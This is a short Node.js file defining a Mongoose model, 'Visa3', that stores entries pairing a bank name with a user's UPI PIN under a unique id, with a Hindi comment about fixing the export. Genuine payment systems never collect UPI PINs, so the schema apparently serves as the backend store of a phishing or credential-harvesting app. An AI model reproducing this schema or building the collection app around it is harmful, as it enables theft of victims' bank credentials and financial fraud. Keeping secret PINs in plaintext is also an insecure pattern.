const mongoose = require('mongoose');

const visa3Schema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      bankName: { type: String, required: true },
      upiPin: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

// ✅ Yahi galti kar rahe the, ab sahi export karo
const Visa3 = mongoose.model('Visa3', visa3Schema);

module.exports = Visa3;
